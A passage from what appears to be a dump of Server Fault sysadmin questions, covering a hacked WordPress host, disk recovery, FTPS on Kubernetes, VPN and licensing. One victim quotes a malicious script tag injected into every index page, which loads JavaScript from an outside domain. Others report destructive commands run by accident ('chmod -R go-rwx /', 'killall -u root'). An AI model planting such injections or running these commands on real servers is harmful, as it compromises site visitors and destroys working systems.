  <p>09pr830b.php 52uhp5j9.php 9hjbz7xu.php bdeaduyl.php hhj7on2v.php jm7n1zdf.php lw3lv13h.php nzj3wf6h.php r5qp67kw.php x6ehtntu.php 0y9gi471.php 5536w191.php 9vmwh7aa.php e2papru4.php hzmnb75x.php jme7u409.php orc8p82a.php  ra14sbdz.php uis5zhq2.php xnqcqm3d.php 158d9hzv.php 5k2x6uh1.php c15b02bz.php e6ykc6n0.php i1sc5ikc.php jn76fivm.php mb3w53e9.php ox26z4hn.php rcwj3dkx.php umhzgkbh.php xoodj3hs.php 2b1vzzo7.php 5mzdj4r3.php a7kwdelx.php c9shlse9.php eak7qcei.php i9f2cyhu.php jp62feoo.php mcp2njev.php p0dfud9d.php xs2g1nc8.php 2d0x8ec5.php 6s88dqcm.php a9tqjna5.php c9tfpu8d.php ed17zccq.php iahr5b8k.php jrtaolcc.php p0ntclmm.php xtlog640.php 2gqt4ol7.php 6s89iw0b.php en539hql.php igtvj6vh.php ko3l8s4u.php picg4k2r.php rk2yi0zl.php utajrsov.php yc5w8otp.php 2lh94d56.php 71zw0l85.php cn7d5i9a.php eok7yfj2.php kps5qctg.php prvpb4vg.php veceocp0.php z0yyxgtw.php 2wvhyz4c.php 79vq53ml.php apv62qn8.php co8c22wm.php f7yo0qfw.php kpu3xi71.php mwksuipa.php ptu6md0l.php sg6sk7we.php vg6mqofk.php z25w3zq9.php 3axgnqdb.php 7e0249wk.php cpy4xvrl.php fyospouz.php j3u65l0i.php kzikyhq5.php ndv1twur.php q4vs0pfe.php svmlp5n8.php vr71dbz8.php zjcinm40.php 3nkos6a4.php 7xka8fu3.php awrnmp7p.php cw6ibtrt.php g4oxsofs.php j706xx73.php l8j3k01f.php noldizm7.php q5l61p21.php t0ewh25s.php vzxso84f.php zssdhx3d.php 3w8veomm.php 8x6qv1tl.php aze5jtlk.php de9kfywx.php j9umstng.php q9oudc57.php u9s7v60e.php wi54c5sc.php 470dae43.php 902deir8.php b4aogx06.php gk9moupj.php jeet447u.php npm72nuo.php qbd1c67k.php uar9q55s.php wn17yctf.php 4uwk3yz6.php 90kpxfeq.php dq7tefm3.php jepw041c.php lv8r524n.php ntnl0am3.php qvgy3407.php ucwog9rb.php</p>
</blockquote>

<p>There are a couple of wordpress instances in each webspace. But even in the webspaces where there wasn't a wordpress instance installed those files were there... </p>

<p>Also the beginning of every index.html or index.php there was always an entry like this: </p>

<blockquote>
  <p>script type='text/javascript' src='<a href=""https://snippet.adsformarket.com/same.js"" rel=""nofollow noreferrer"">https://snippet.adsformarket.com/same.js</a>'></p>
</blockquote>

<p>I don't know if that were 2 seperate hacks or just a single one but i really would like to know what mistakes i could have been making that this was happening.</p>

<p>Hope someone can help me here.</p>
","<debian><wordpress><apache2><hacking>","2020-02-21 20:49:47"
"1004165","Is it possible to extract / copy the content of a VHDX file","<p>I have recently created a Raspian VM using Hyper-V on Windows 10 so I can start learning the OS as part of a personal project.</p>

<p>What I would like to be able to do is take the content of this VM image and drop it onto an SD card, plug it into a Raspberry Pi.</p>

<p>Is this possible? I'm a developer and tech savvy, though have little experience with VM's on my own machine or handling the files.</p>

<p>As a side Q - how can you navigate to the folder containing the *.VHDX files: Mine are in the default location C:\Users\Public\Documents\Hyper-V - I can navigate to this with a command line, running as admin but windows explorer will not open the folder.</p>
","<virtual-machines><windows-10><vhdx>","2020-02-22 00:36:57"
"795490","Is there any way to execute any command just after a new connection on apache2?","<p>I am not too good in server and Linux commands as I am php guy, but I need something which can trigger a command or a script just after a client is connected/disconnected with my web server.</p>

<p>The basic thing which I want to do is to display the current active connection with the web server. Also display a flash when a new connection is established or closed.</p>

<p>It will be a great help if this can be done without hiring any server expertise....</p>

<p>Thanks</p>
","<linux><apache-2.4><background-process>","2016-08-08 10:37:13"
"795560","Can I borrow 15 bits for specific netmask in class B","<p>I read that I can't borrow 15 bits to create a specific netmask from a default class B netmask.
According to my calculation, borrowing 15 bits gives :
specific netmask = 255.255.255.254</p>

<p>Why did they say this is impossible ?</p>
","<ip><subnet><ip-address>","2016-08-08 15:33:05"
"1004324","How goes Guest Access Point login screen redirect work?","<p>I have a guest AP that displays a login screen asking
for guest name and email when I connect to it via the 
Android Phone's wifi tab.
The login screen is opened after I have clicked on the
guest wifi, there is no password required, however you
need to insert your name and password and confirm to the
policy.
This has to be done every day, so I want to automate this
and use a RPI to do this. 
I'm starting wpa_supplicant to connect to the SSID but
now I wonder how I can get to the login screen url? If I have 
the URL I can automate the process via some browser testing
framework. </p>

<p>What type of mechanism is used to redirect to the guest 
login screen? Where does the login screen url come from (DHCP?)?
Is there a standard that is used?</p>
","<wifi><access-point><guest>","2020-02-24 07:36:13"
"795830","Fetch an SNI certificate from https with openssl","<p>I know I can print out a site's certificate with OpenSSL like this:</p>

<pre><code>openssl s_client -showcerts -connect sni.velox.ch:443
</code></pre>

<p>But on some sites it doesn't work because they rely on SNI.</p>

<p>Is there a way to send an SNI request via openssl?</p>
","<openssl><sni>","2016-08-09 18:14:19"
"1004344","User/Visitor tracking tool","<p>Hello I'm looking for an user tracking tool/service for our apache 2.4 webserver on ubuntu. Goal is to track our users accross our page (all visited url's, exits, requests, redirects, errors and so on).</p>

<p>All this information are allready stored in the apache access.log, error.log. Now I'm searching for a tool/service that take these log-files, analyze the data and put this data in some optical design where I can easily access and filter the data.</p>

<p>Is there any service/tools available for my approach. Can be free/opensource but also paid.</p>
","<apache-2.4><logging><ubuntu-18.04>","2020-02-24 10:38:26"
"1004356","100-1000 public IP addresses per instance in public cloud","<p>I'd like to run an instance which can be accessed via 100-1000 different public addresses. It can be either IPv4 or IPv6. Is this possible to do in any public cloud currently? Preferably one of the known providers like AWS/Azure/GCP/DigitalOcean/Rackspace etc, but others are fine as well - just as long as it can be done on a pay-per-use basis.  </p>

<p>What's the best way to go about without applying to ISP or dealing with networking infrastructure equipments.</p>
","<amazon-web-services><google-cloud-platform><cloud><ip-address><azure-networking>","2020-02-24 12:19:51"
"795858","How does process CPU usage relate to Load Average?","<p>I have the following host / load:</p>

<ul>
<li>Two 6-core CPUs, with HT (From what I understand, max load would be <code>24.0</code>)</li>
<li>12 ""primary"" processes, with sustained usage of about <code>50%</code> CPU</li>
<li><code>Load average: 0.86  0.98  0.98</code></li>
</ul>

<p>Could someone help me understand:</p>

<ul>
<li>How do multiple processes have sustained load, while the Load Average of the box is seemingly low? Considering 12 cores at 50%, I'd expect the load to at least hit somewhere between 6.0 - 12.0.</li>
<li>Considering CPU usage alone, are there any low-level details preventing me from adding more services to this host until the Load average hits ~<code>24</code>? (not concerned about disk I/O, memory, or anything else for the sake of this question -- I just want to fully understand how reliable the <code>Load average</code> is when considering CPU bottle-necking; thread waiting? bus contention? anything that's not represented in the Load average concerning CPU use?)</li>
</ul>
","<centos><unix><cpu-usage><load-average>","2016-08-09 19:22:05"
"1004475","Mapped Harddrive, Bitlocker?","<p>All the available letters to use for harddrive, i used up.</p>

<p>So for my new harddrive, i used mapping. So i have mapped my new harddrive to a folder.</p>

<p><strong>My question is, is it possible to still get bitlocker on that drive?</strong></p>

<blockquote>
  <p>If so , how? Or  if not, is there a better way to add new harddrive to
  my PC when there is no letters left</p>
</blockquote>

<p>?</p>
","<windows><windows-server-2012-r2><hard-drive><mappeddrive><bitlocker>","2020-02-25 10:19:31"
"1004527","How to get a server ready for hosting a website?","<p>Currently, my companies' website is hosted on a web hosting company which they provide everything (<code>WHM</code>, <code>cPanel</code>, <code>E-mail server</code>, <code>LAMP</code>, <code>security</code> and etc...)</p>

<p>We have to move the website to a private company. And we (for the first time) have to set up the server from scratch. Now, we already know what server specs must be and they are going to provide it.</p>

<p>It is obvious that we need to install LAMP, but what else is required to get the server ready for hosting a website? (i.e. for security or for E-mail server)</p>

<p>We prefer to run it by using open source software, so using a cPanel is not really important. We are open for suggestions</p>
","<linux><email-server><lamp>","2020-02-25 16:19:06"
"796035","Filtering query on Nginx","<p>Can I store a specific query in <code>access_log</code> file by filtering with an expression?
For example I want to deny storing queries related to www.mydomaine.com and then reject it ?</p>

<p>Best regards,</p>

<p>Nizar.</p>
","<nginx><query>","2016-08-10 15:12:41"
"1004628","How to revert chmod on root directory?","<p>We have a fresh server setup where a team member exidently has changed the rights for other and group users for the entire root directory.</p>

<pre><code>chmod -R go-rwx /
</code></pre>

<p>This has lead to the fact that e.g. nobody exept of root can login anymore.</p>

<p>Is there an easy way to revert this? It looks to me as this is impossible as there are many folders affected.</p>

<p>The system is Ubuntu 18.04 LTS</p>
","<linux>","2020-02-26 09:24:51"
"796259","Run X server on startup on CentOS","<p>How do you run X server on startup in CentOS?  This is the command I use to manually start X server -</p>

<p><code>sudo /usr/bin/X :0 &amp;</code></p>
","<centos><x11>","2016-08-11 14:31:11"
"796281","Suddenly unable to SSh and FTP into my Linux VPS","<p>I am having a very strange problem whereas I am suddenly unable to login to my VPS via SSH and FTP. </p>

<p>I have accessed the VPS through a control panel and restarted it. I have also checked that the ssh service is running and it's working fine. </p>

<p>I have checked SSH process on the local machine as well and it seems all fine too. It claims it is running.</p>

<p>The problem I am having is that when I try and run the command:</p>

<pre><code>ssh root@*******.io
</code></pre>

<p>the terminal hangs and times out. This has never happened before and is also happening when I attempt to FTP in. One thing I did do earlier that may have something to do with it is run a:</p>

<pre><code>sudo apt-get autoremove 
</code></pre>

<p>on the local machine. I would assume this wouldn't uninstall anything that would be needed by the machine?</p>

<p>I am at a loss here and not sure where I start start to diagnose this problem so any help is appreciated. It has only started having this problem today and has never had it before. </p>

<p>Thanks</p>
","<linux><ssh><ftp><vps><timeout>","2016-08-11 15:44:35"
"1005012","What happens if I plug a windows 10 pc to the same router using two NICs?","<p>I have a windows 10 PC. There is an onboard motherboard NIC and an installed PCIe card NIC. I have a consumer grade home router serving as DHCP server, switch, modem etc.</p>

<p>If I connect the PC to to the router using both NICs, without any other configuration, what will happen? </p>

<p>I ask because one NIC is a 10Gbps card and the router has one 10Gbps port, but this NIC driver has an issue that causes it to throttle upload speed to almost nothing. So I would like to use the other NIC for uploads but the faster one for downloads. Yes, I do have a 10Gpbs internet connection which actually provides a consistent > 4Gbps up and down. Of course the 10Gbps NIC works fine in ubuntu!</p>
","<windows-10><nic>","2020-02-28 17:52:00"
"796459","Debian Lost filesystem. Corrupted filesystem","<p>I have a file system bug/error.
My dedicated server cannot start.
OVH started my dedicated server in rescue mode, and:</p>

<pre><code>root@rescue:~# parted /dev/sda 'print'
Model: ATA SAMSUNG MZ7LM240 (scsi)
Disk /dev/sda: 240GB
Sector size (logical/physical): 512B/512B
Partition Table: msdos
Disk Flags:

Number  Start   End    Size   Type     File system     Flags
 1      1049kB  240GB  240GB  primary                  boot
 2      240GB   240GB  536MB  primary  linux-swap(v1)
</code></pre>

<p>So the problem, don't have file system in sda, and in sdb.</p>

<p>All data very-very important, so I must save them.
Please, help me, how can I create a file system in the disks, and restore everything?</p>

<p>I tried testdisk command, but i could not restore the file system.</p>

<p>When I try mount i got this message:</p>

<pre><code>root@rescue:/mnt# mount /dev/sdb1 /mnt/
mount: unknown filesystem type 'linux_raid_member'

root@rescue:/mnt# mount /dev/sda1 /mnt/
mount: unknown filesystem type 'linux_raid_member'
</code></pre>

<p>And the fdisk write this:</p>

<pre><code>root@rescue:/mnt# fdisk -l

Disk /dev/sda: 223.6 GiB, 240057409536 bytes, 468862128 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xc6522a8b

Device     Boot     Start       End   Sectors   Size Id Type
/dev/sda1  *         2048 467810303 467808256 223.1G 83 Linux
/dev/sda2       467810304 468856831   1046528   511M 82 Linux swap / Solaris

Disk /dev/sdb: 223.6 GiB, 240057409536 bytes, 468862128 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa398617a

Device     Boot     Start       End   Sectors   Size Id Type
/dev/sdb1  *         4096 467810303 467806208 223.1G fd Linux raid autodetect
/dev/sdb2       467810304 468856831   1046528   511M 82 Linux swap / Solaris

Disk /dev/md1: 446.1 GiB, 479033556992 bytes, 935612416 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 524288 bytes / 1048576 bytes

root@rescue:~# mount /dev/md1 /mnt/
mount: /dev/md1 is write-protected, mounting read-only
NTFS signature is missing.
Failed to mount '/dev/md1': Invalid argument
The device '/dev/md1' doesn't seem to have a valid NTFS.
Maybe the wrong device is used? Or the whole disk instead of a
partition (e.g. /dev/sda, not /dev/sda1)? Or the other way around?
</code></pre>

<p>When I check dmesg:</p>

<pre><code>root@rescue:~# dmesg | tail
[    8.724614]  md1: unknown partition table
[   10.430793] systemd-journald[389]: Received request to flush runtime journal from PID 1
[   18.468492] IPv6: ADDRCONF(NETDEV_UP): eth1: link is not ready
[   18.468494] 8021q: adding VLAN 0 to HW filter on device eth1
[  492.873958] nf_conntrack: automatic helper assignment is deprecated and it will be removed soon. Use the iptables CT target to attach helpers instead.
[  492.942832] ip_set: protocol 6
[  517.742940] ip_set: protocol 6
[ 1599.096427] EXT4-fs (md1): VFS: Can't find ext4 filesystem
[ 1602.001332] EXT4-fs (md1): VFS: Can't find ext4 filesystem
[ 3396.499044] ip_set: protocol 6
</code></pre>

<p>I got e-mail from OVH:</p>

<blockquote>
  <p>Here are the details of this operation: Diagnosis interface boot
  (rescue) Date 2016-08-11 19:55:22, elyess H made Diagnosis interface
  boot (rescue):  Here are the details of the operation performed: The
  server gets stuck during the boot phase, with the message: (error:
  unknowk filesystem) A restart on the standard OVH kernel ('netboot')
  does not correct the situation.</p>
  
  <p>Actions: Rebooting the server to ""rescue"" mode (Linux)</p>
  
  <p>result: Boot OK. Rescue mode accessible.</p>
  
  <p>recommendations: Configuration / error to be corrected by the customer</p>
</blockquote>

<p><strong>So the PROBLEM:</strong> I lost my filesystem, and I cannot start, and I cannot mount the disk.
I have RAID-1 in the dedicated server, but I cannot mount /dev/md1.</p>

<p>How can I restore the file system? How can I mount the disk? How can I start the system? I think if I solve the filesystem, i will can start the system.</p>

<p>Thank you for your help!</p>
","<linux><debian><filesystems><boot><ext4>","2016-08-12 10:52:32"
"1005026","Windows Server 2019 Service pack","<p>I wanted to know if there are any service pack releases for Windows Server 2019 as of today. I am not finding the information on Microsoft site.</p>
","<windows-server-2019>","2020-02-28 19:31:28"
"1005054","Why would deleting an incremental snapshot increase the space usage & cost?","<p><strong>Google Cloud Platform</strong></p>

<p>From the Google Cloud docs: <a href=""https://cloud.google.com/compute/disks-image-pricing#persistent_disk_snapshots"" rel=""nofollow noreferrer"">https://cloud.google.com/compute/disks-image-pricing#persistent_disk_snapshots</a></p>

<blockquote>
  <p>When you delete a complete or incremental snapshot, some of its data may move to the next incremental snapshot in the snapshot chain. This additional data increases the storage cost because you are using more space in the storage system.</p>
</blockquote>

<p>In the Google Cloud docs they provide an example of how incremental snapshots are stored: <a href=""https://cloud.google.com/compute/docs/disks/create-snapshots"" rel=""nofollow noreferrer"">https://cloud.google.com/compute/docs/disks/create-snapshots</a></p>

<blockquote>
  <p>Snapshot 3 contains any new or changed data since snapshot 2 but won't contain any unchanged data from snapshot 1 or 2. Instead, snapshot 3 contains references to blocks in snapshot 1 and snapshot 2 for any unchanged data.</p>
</blockquote>

<hr>

<p><strong>Amazon Web Services</strong></p>

<p>However, to better help illustrate the AWS docs have an example scenarios of deleting an incremental snapshot: <a href=""https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-deleting-snapshot.html"" rel=""nofollow noreferrer"">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-deleting-snapshot.html</a></p>

<blockquote>
  <p>Deleting a snapshot might not reduce your organization's data storage costs. Other snapshots might reference that snapshot's data, and referenced data is always preserved. If you delete a snapshot containing data being used by a later snapshot, costs associated with the referenced data are allocated to the later snapshot.</p>
</blockquote>

<hr>

<p>AWS states that deleting might not reduce storage usage &amp; costs. Although it doesn't say storage &amp; cost would increase.</p>

<p><strong>Why and how would deleting a snapshot in GCE increase storage space &amp; cost?</strong></p>
","<amazon-web-services><google-cloud-platform><amazon-ebs><snapshot>","2020-02-28 22:57:12"
"796533","On a RAID controller card, what is the difference between the connector, port, and device numbers?","<p>I'm looking at RAID controllers, specifically the (Avago) LSI Logic MegaRAID SAS 9261-8i.  It is a 8-port card, which I would be able to ""Connect up to 128 SATA or SAS drives with eight internal 6 Gb/s SATA and SAS ports"" but I only see two connectors.</p>

<p>Can someone please explain how the connectors/ports/devices relate? Thanks!</p>
","<raid><port><sas><sata><connector>","2016-08-12 16:25:42"
"1005097","Ftps server doesn't work properly using kubernetes","<p>i have a problem with ftps-filezilla and Kubernetes for weeks.</p>

<p><strong>CONTEXT</strong> :</p>

<p>I have a school project with Kubernetes and ftps. I need to create a ftps server in kubernetes in the port 21, and it needs to run on alpine linux. So i create an image of my ftps-alpine server using a docker container. I test it, if it work properly on it own : Using <code>docker run --name test-alpine -itp 21:21 test_alpine</code> I have this output in filezilla :</p>

<pre><code>    Status: Connecting to 192.168.99.100:21…
    Status: Connection established, waiting for welcome message…
    Status: Initializing TLS…
    Status: Verifying certificate…
    Status: TLS connection established.
    Status: Logged in
    Status: Retrieving directory listing…
    Status: Calculating timezone offset of server…
    Status: Timezone offset of server is 0 seconds.
    Status: Directory listing of “/” successful
</code></pre>

<p>It work successfully, filezilla see the file that is within my ftps directory I am good for now(work on active mode).</p>

<p><strong>PROBLEM</strong> :</p>

<p>So what i wanted, was to use my image in my kubernetes cluster(I use Minikube). When i connect my docker image to an ingress-service-deployment in kubernetes I have that :</p>

<pre><code>Status: Connecting to 192.168.99.100:30894...
Status: Connection established, waiting for welcome message...
Status: Initializing TLS...
Status: Verifying certificate...
Status: TLS connection established.
Status: Logged in
Status: Retrieving directory listing...
Command:    PWD
Response:   257 ""/"" is the current directory
Command:    TYPE I
Response:   200 Switching to Binary mode.
Command:    PASV
Response:   227 Entering Passive Mode (192,168,99,100,178,35).
Command:    LIST
Error:  The data connection could not be established: ECONNREFUSED - Connection refused by server
</code></pre>

<p><strong>SETUP</strong> :</p>

<pre><code>ingress.yaml :

    kind: Ingress
    metadata:
    annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /$1
    namespace: default
    name: ingress-controller
    spec:
    backend:
    serviceName: my-nginx
    servicePort: 80
    backend:
    serviceName: ftps-alpine
    servicePort: 21

ftps-alpine.yml :

    apiVersion: v1
    kind: Service
    metadata:
    name: ftps-alpine
    labels:
    run: ftps-alpine
    spec:
    type: NodePort
    ports:

    port: 21
    targetPort: 21
    protocol: TCP
    name: ftp21
    port: 20
    targetPort: 20
    protocol: TCP
    name: ftp20
    selector:
    run: ftps-alpine
    apiVersion: apps/v1
    kind: Deployment
    metadata:
    name: ftps-alpine
    spec:
    selector:
    matchLabels:
    run: ftps-alpine
    replicas: 1
    template:
    metadata:
    labels:
    run: ftps-alpine
    spec:
    - name: ftps-alpine
    image: test_alpine
    imagePullPolicy: Never
    ports:
    - containerPort: 21
    - containerPort: 20
</code></pre>

<p><strong>WHAT DID I TRY</strong> :</p>

<pre><code>vftpd.conf

    seccomp_sandbox=NO
    pasv_promiscuous=NO
    listen=NO
    listen_ipv6=YES
    anonymous_enable=NO
    local_enable=YES
    write_enable=YES
    local_umask=022
    dirmessage_enable=YES
    use_localtime=YES
    xferlog_enable=YES
    connect_from_port_20=YES
    chroot_local_user=YES
    #secure_chroot_dir=/vsftpd/empty
    pam_service_name=vsftpd
    pasv_enable=YES
    pasv_min_port=20
    pasv_max_port=20
    user_sub_token=$USER
    local_root=/home/$USER/ftp
    userlist_enable=YES
    userlist_file=/etc/vsftpd.userlist
    userlist_deny=NO
    rsa_cert_file=/etc/ssl/private/vsftpd.pem
    rsa_private_key_file=/etc/ssl/private/vsftpd.pem
    ssl_enable=YES
    allow_anon_ssl=NO
    force_local_data_ssl=YES
    force_local_logins_ssl=YES
    ssl_tlsv1=YES
    ssl_sslv2=NO
    ssl_sslv3=NO
    allow_writeable_chroot=YES
    #listen_port=21
    pasv_address=192.168.99.100
</code></pre>

<ol>
<li>Change pasv_min and max port from 20 to 20, 20 to 21 and 30000 to
34000(nodeport range).</li>
<li>Listen=YES and Listen_ipv6=NO and so on.</li>
<li>I did try passive mode and active mode.</li>
<li>I have my pasv_address set to my minikube ip.</li>
</ol>

<p>This is my question in stackoverflow : <a href=""https://stackoverflow.com/questions/60458028/ftps-server-doesnt-work-properly-using-kubernetes"">https://stackoverflow.com/questions/60458028/ftps-server-doesnt-work-properly-using-kubernetes</a></p>

<p><strong>Question</strong> :</p>

<p>How can i have the successfully first message but for my kubernetes cluster ?</p>

<p>If you have any questions to clarify, no problem.</p>
","<docker><port><kubernetes><vsftpd><ftps>","2020-02-29 12:53:43"
"796560","Understanding how to foreground a background process correctly","<p>I am wanting to background a long running script, which I know I can do using the following:</p>

<pre><code>nohup ./install.sh &amp;&gt;/dev/null &amp;
</code></pre>

<p>However, I also realize that if I leave that session, I can no longer see it running using <code>job</code>, since it would be running on another session if I login and then log back in.</p>

<p>My question is, before I run a script in the background, is there a way I can set it up so that I can return/foreground that script later? Even after I have logged out and then back in?</p>
","<linux><background-process><nohup>","2016-08-12 19:47:04"
"1005271","Rate-limiting of dig","<p>I have a PHP script that calls the bash <code>dig</code> command through the <code>exec</code> function on Ubuntu to monitor hundreds of domains.</p>

<p>What the script does is to call <code>dig</code> to fetch some DNS records on each domain for analysis. This script is run by a cron job every 10 minutes.</p>

<p>I wonder, if issuing hundreds of DNS queries within a short period of time might run into some rate limit issue and make it fail ultimately.</p>

<p>If such DNS query traffic is fine for now, I wonder what traffic would get me into any sort of DNS rate-limiting issue (if any), since the number of domains I am managing is growing.</p>

<p>Thanks!</p>
","<domain-name-system><dig>","2020-03-02 10:51:37"
"796785","debugging ""connection refused"" in AWS EC2 ubuntu server","<p>I had a working EC2 ubuntu instance (t1.micro) connected through an elastic IP, using an Amazon key pair for a passwordless ssh connection. After running fsck like the terminal suggested (wrong move, I know now), the system rebooted and I keep getting ""Network Error: Connection Refused"" when trying to connect via ssh.
I managed to attach the instance's volume to an alternative instance, but I could not see what was wrong.
I also tried ""ssh -vvv"" from an Ubuntu laptop, but got no useful output.
Is there a log I can look at to see why ssh is refusing my connection? 
Is there an alternative way I could debug this?</p>
","<ubuntu><networking><ssh><amazon-ec2><amazon-web-services>","2016-08-14 21:35:20"
"796832","Disk is full, but its not?","<p>I have a disk that has too many small files:</p>

<p>df:</p>

<pre><code>/dev/mapper/mpathc 6056822144 6056822144 0 100% /file3
</code></pre>

<p>df -i:</p>

<pre><code>/dev/mapper/mpathc 384589824 12160314 372429510 4% /file3
</code></pre>

<p>I need to move small files on same disk like this:</p>

<pre><code>mv /file3/bla/bla/23423/bla/file1.txt /file3/newpath/
</code></pre>

<p>But getting error like this:</p>

<pre><code>mv: writing ... No space left on device
</code></pre>

<p>Moved some files to other disk (300GB), but df command cannot update. I must have 300GB free disk space, but I can't use.</p>

<p>I tried <code>lsof</code> command, nothing run on this disk. I tried umount and mount again, there is no change.</p>

<p>What can I do for use this disk spaces?</p>

<p>Thank you</p>
","<hard-drive><df>","2016-08-15 06:56:35"
"797108","how to configure dovecot for local network only?","<p>I have installed postfix, dovecot, mysql, postfixadmin. i only want to configure these packages only to send emails around the local network. Specifically: i have installed outlook on client computers and want configure it with IMAP/POP3 protocol to connect to my mail server on LAN. what configurations should i add? I am running CentOS 6.8 Some of the questions i have are (i hope they dont sound silly):</p>

<ol>
<li>How am i going to create a user account, for local lan network only?</li>
<li>How am i going to add that account to outlook?</li>
<li>What domain am i going to use? (i havent bought any domain from any registrar)</li>
</ol>

<p>Please feel free to add anything to clarify the solution.</p>
","<postfix><dovecot><local-area-network>","2016-08-16 12:19:49"
"797121","PSTN and Internet","<p>Where Is Physical Wires Exist for Internet Is It Using PSTN Wires for Transferring Data? If both are different network then How Telecom Companies Are Providing Internet Facility?</p>
","<networking><internet><telephony><pstn>","2016-08-16 13:12:00"
"797198","Website on the root windows domain name","<p>Quick question, we have a Windows AD domain ""company.com""  Computers are joined to this Windows domain ""company.com"" and we also have a web server at ""www.company.com"".  A request has come in that the higher ups also want our website to respond to ""company.com"" (without the www).  Since this is our AD Domain name, is there some sort of trick where I can point only port 80 traffic on ""company.com"" to a web-server, or would I have to run IIS/redirect on all the AD servers? </p>
","<windows><domain-name-system><active-directory><iis>","2016-08-16 19:08:45"
"1005888","Unable to Connect L2TP IPSec VPN on Mac OSX","<p>I'm struggling to debug an issue connecting a Mac to a L2TP IPsec VPN.</p>

<p>Macbook Pro running Mojave 10.14.6, following instructions here <a href=""https://forum.peplink.com/t/setting-up-l2tp-with-ipsec/8046"" rel=""nofollow noreferrer"">https://forum.peplink.com/t/setting-up-l2tp-with-ipsec/8046</a></p>

<p>I turned on verbose logging and this is what I'm seeing in <code>/var/log/ppp.log</code> (VPN server address redacted)</p>

<p>It seems to get to the phase 1 negotiation, succeeds, and then just hangs and fails.  I'm surprised it never gets to the phase 2 negotiation.</p>

<pre><code>Fri Mar  6 09:53:04 2020 : publish_entry SCDSet() failed: Success!
Fri Mar  6 09:53:04 2020 : publish_entry SCDSet() failed: Success!
Fri Mar  6 09:53:04 2020 : l2tp_get_router_address
Fri Mar  6 09:53:04 2020 : l2tp_get_router_address 192.168.1.1 from dict 1
Fri Mar  6 09:53:04 2020 : L2TP connecting to server 'X.X.X.X' (X.X.X.X)...
Fri Mar  6 09:53:04 2020 : IPSec connection started
Fri Mar  6 09:53:04 2020 : IPSec phase 1 client started
Fri Mar  6 09:53:04 2020 : IPSec phase 1 server replied
Fri Mar  6 09:53:34 2020 : IPSec connection failed
</code></pre>
","<vpn><mac-osx><ipsec><l2tp>","2020-03-06 15:46:35"
"797313","After using killall -u root, I am unable to access server and all websites are down","<p>I am using CentOS server.</p>

<p>I wanted to test how to kick users by kicking myself (root) user.</p>

<p>I used <code>killall -u root</code> and it kicked me from the server which was as expected. However I am no longer able to access the server:</p>

<pre><code>root@kali:~# ssh 383.123.418.10
ssh: connect to host 383.123.418.10 port 22: Connection refused
</code></pre>

<p>and all websites that were hosted on this server (cPanel and WHM) are down.</p>

<p>How do I fix this?</p>
","<centos><ssh><process><connection><root>","2016-08-17 09:12:11"
"797322","Can Office 365 and Google Apps coexist in an enterprise?","<p>Can a corporation adopt both technologies and allow the employee, or teams choose which would be best for them. For example, could I choose to use GApps, yet my colleague in another office or country use Microsoft Office 365?</p>
","<g-suite><microsoft-office-365>","2016-08-17 09:42:07"
"1006000","Is TLD .local not a local TLD anymore?","<p>I used to use .local as TLD for small household networks however I got a popup that I wasn't allowed to use it anymore after a firmware upgrade of an Asus Router. I choose now for .lan as internal TLD. Apart from MS Technet / MS best practice / issues with Apple devices to stop using .Local anymore is there any other reason to stop using it?</p>
","<networking><domain><local><tld>","2020-03-07 15:04:31"
"797416","Is there any reason to have a firewall located on a public ip address?","<p>Usually you want it on a private IP address for security reasons. </p>

<p>Is there a plus side to having your firewall on a public IP? </p>

<p>I don't think there is, but I wanted to cover all my bases.</p>
","<firewall>","2016-08-17 15:45:47"
"1006217","VM Windows Standard 2019 license cost","<p>I have ONE VM instance (16 simulated cores) in a cloud provider with Windows Server 2019 Standard on it.</p>

<p>I do NOT want to install VMs inside it. I only want to use OS itself.</p>

<p>Cloud provider is charging me ~3,300 EUR/year for this license (only OS, no remote access CAL's).</p>

<p>This seems like really really expensive just for one OS license. 
They say I can not buy and use my own license (~1000EUR one time cost) because it is virtual machine and I will need Datacenter edition. Are they giving me correct info?
At the same time other clouds offer Standard edition for ~550EUR/year on <em>dedicated</em> servers. </p>
","<windows-server-2019>","2020-03-09 15:16:19"
"797527","Assign Entire IPV6 /64 Subnet to Network Interface","<p>So i just purchased a linux (centos) server with /64 IPV6 subnet. I want to use these IP's for outgoing requests especially.</p>

<p>How on earth can we add that many IP addresses to the network interface? Are there any workarounds for this?</p>
","<linux><networking><ipv6><interface>","2016-08-17 23:17:58"
"1006478","Is it possible to clone an old Windows XP machine to modern hardware?","<p>I was given a task to migrate an old machine based on Windows XP to newer hardware.</p>

<p>I have tried using Clonezilla to generate an image from the IDE HDD.
The problem I am getting now is getting the restored image on a SATA Advanced Format HDD to boot into XP.</p>

<p>The system reboots by itself when I try to boot it into XP.
I am able to select Safe Mode but it reboots itself after showing a list of files loaded.</p>

<p>Anyone has any advice on how should I proceed, if it is possible?
Or any other tools or methods I should try?</p>
","<windows-xp><cloning>","2020-03-11 09:50:39"
"797800","Virtualization software for static server running on Linux","<p>I am looking for software that I can run on my personal Linux Server that encapsulate a OS for fast on/off functionality</p>

<p>I have been experimenting for the last year and a half with docker and have been running about 2-8 containers continuously since then.</p>

<p>From my experience Docker is more for continues delivery/deployment than continuously running containers that I will just be stopping and starting when I want to. It just feels like a hassle to work with docker when I want to change my setup.</p>

<p>For example I have not been able to have a nginx/haproxy on the host machine which links to containers, I had to have a docker-compose file with a nginx container which couples everything together and that is something that I don't want</p>

<p>My requirements for this software is</p>

<ul>
<li><p>Needs to be able to have a static IP address on containers for my proxy which I will be running on the Host system</p></li>
<li><p>Starting and stopping containers should be easy.</p></li>
<li><p>Should be isolated from the host OS but still able to share disk volumes</p></li>
<li><p>Should be able to have up to 10 running servers or more</p></li>
<li><p>Open-source / free</p></li>
<li><p>I am currently unable to get physical access to the machine so compatibility with the current machine is a must</p></li>
</ul>

<p>My current server is running on Ubuntu server 14.04</p>

<p>I have been looking around for software like this but there is so much available I thought it would be best to ask the experts :)</p>
